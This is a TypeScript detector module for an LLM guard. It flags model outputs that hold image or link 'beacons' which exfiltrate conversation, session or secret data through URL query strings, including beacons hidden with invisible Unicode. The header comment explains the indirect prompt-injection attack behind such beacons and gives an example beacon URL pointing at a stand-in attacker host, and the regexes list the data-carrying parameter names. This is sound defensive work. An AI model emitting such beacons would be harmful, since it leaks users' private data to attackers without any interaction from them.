import { detectPatterns, type PatternRule } from "./helpers";

/**
 * Output-side data-exfiltration ("zero-click" beacon) detector.
 *
 * The highest-blast-radius agentic attack of 2025-2026 is not a jailbreak in the
 * model's *words* — it is a rendered link the user never clicks. An indirect
 * prompt injection makes the model emit a markdown image such as
 *
 *     ![](https://attacker.tld/c?d=<base64-of-the-conversation>)
 *
 * The chat/agent UI auto-loads the image, and the victim's context, secrets or
 * PII ride out in the query string with zero interaction. The same trick works
 * with `<img src>`, ordinary markdown/auto links, and payloads hidden behind
 * invisible Unicode inside the URL.
 *
 * This runs on the OUTPUT direction only (registered in analyze.ts) and emits the
 * DATA_EXFILTRATION risk type, which the decision engine hard-BLOCKs on output.
 * Because DATA_EXFILTRATION is a security variant type (see helpers.ts), every
 * rule below is also evaluated against decode/normalize variants, so an encoded
 * or invisible-Unicode-smuggled beacon is caught after normalization.
 *
 * Precision is deliberately asymmetric:
 *  - Auto-loading sinks (markdown image, <img>) use a broad data-carrying
 *    param set — a model response almost never legitimately emits an external
 *    image whose query string carries session/token/context data.
 *  - Clickable links use a narrow, almost-always-malicious param set
 *    (data/leak/exfil/session/cookie/…) to avoid blocking benign example URLs
 *    that a model might legitimately include in prose.
 * Common signed-CDN params (X-Amz-*, Expires, signature, width/quality, …) are
 * explicitly excluded from the encoded-value rule so legitimate image links pass.
 */

// Data-carrying query-parameter names for auto-loading image sinks (broad set).
const IMAGE_EXFIL_PARAMS =
  "data|payload|leak|exfil|dump|conversation|conv|chat_?history|history|session|sid|secret|secrets|creds?|credentials?|cookie|token|prompt|system_?prompt|context|ctx|content|auth|q64|b64";

// Almost-always-malicious param names for clickable links / autolinks (narrow set).
const LINK_EXFIL_PARAMS =
  "data|payload|leak|exfil|dump|conversation|conv|chat_?history|session|sid|secret|secrets|creds?|credentials?|cookie|system_?prompt";

// Benign params commonly seen on legitimate signed/CDN image URLs; excluded from
// the "long encoded value" heuristic so real images do not trip the beacon rule.
const BENIGN_IMAGE_PARAMS =
  "x-amz-[a-z0-9-]+|amz-[a-z0-9-]+|sig|signature|expires?|expiry|se|sv|sp|sr|st|si|token|v|ver|version|hash|etag|cache|cb|t|ts|time|timestamp|w|h|width|height|q|quality|fit|dpr|auto|fm|format|s|size|crop|rev|ixlib|ixid|utm_[a-z]+|id|ref|lang|locale";

// An image sink is either a markdown image `![alt](` or an HTML `<img ... src=`.
const IMG_SINK = String.raw`(?:!\[[^\]]*\]\(\s*<?|<img\b[^>]*\bsrc\s*=\s*["']?)`;
// A clickable markdown link `[text](` (NOT an image — negative lookbehind on `!`)
// or an HTML anchor href, or a bare `<autolink>`.
const LINK_SINK = String.raw`(?:(?<!!)\[[^\]]*\]\(\s*<?|<a\b[^>]*\bhref\s*=\s*["']?|(?<![\w!])<)`;

const URL = String.raw`https?:\/\/[^\s)"'<>]+`;

// Invisible / zero-width / bidi Unicode used to hide an exfil destination in a URL.
const INVISIBLE = "\\u00AD\\u200B-\\u200F\\u202A-\\u202E\\u2060-\\u2064\\uFEFF";

const rules: PatternRule[] = [
  {
    // Auto-loading image beacon whose query string carries context/secret data.
    pattern: new RegExp(`${IMG_SINK}${URL}[?&](?:${IMAGE_EXFIL_PARAMS})=`, "i"),
    label: "Image data-exfiltration beacon",
    message:
      "The response renders an external image whose URL carries conversation, session, or secret data — a zero-click exfiltration channel.",
    severity: "CRITICAL",
    score: 55,
    sensitive: true,
  },
  {
    // Auto-loading image whose query value is a long encoded blob on a
    // non-benign param (catches short data-param names like `?d=<base64>`).
    pattern: new RegExp(
      `${IMG_SINK}${URL}[?&](?!(?:${BENIGN_IMAGE_PARAMS})=)[a-z0-9_.-]{1,24}=[A-Za-z0-9%+/_-]{24,}`,
      "i",
    ),
    label: "Image beacon with encoded payload",
    message:
      "The response renders an external image whose URL embeds a long encoded value — a likely disguised data-exfiltration payload.",
    severity: "HIGH",
    score: 48,
    sensitive: true,
  },
  {
    // Clickable link / autolink whose query carries clearly exfil-only data.
    pattern: new RegExp(`${LINK_SINK}${URL}[?&](?:${LINK_EXFIL_PARAMS})=`, "i"),
    label: "Link data-exfiltration channel",
    message:
      "The response contains a link whose URL carries conversation, session, or secret data to an external destination.",
    severity: "HIGH",
    score: 45,
    sensitive: true,
  },
  {
    // Invisible/zero-width Unicode hidden inside a rendered image URL. The
    // decode variants also surface the visible form, but flag the raw shape too.
    pattern: new RegExp(`!\\[[^\\]]*\\]\\([^)]*[${INVISIBLE}][^)]*\\)`),
    label: "Image URL with hidden Unicode",
    message:
      "An image URL in the response contains invisible Unicode characters, a technique used to hide an exfiltration destination.",
    severity: "HIGH",
    score: 45,
    sensitive: true,
  },
];

export function outputExfiltrationDetector(text: string) {
  return detectPatterns(text, "DATA_EXFILTRATION", rules);
}
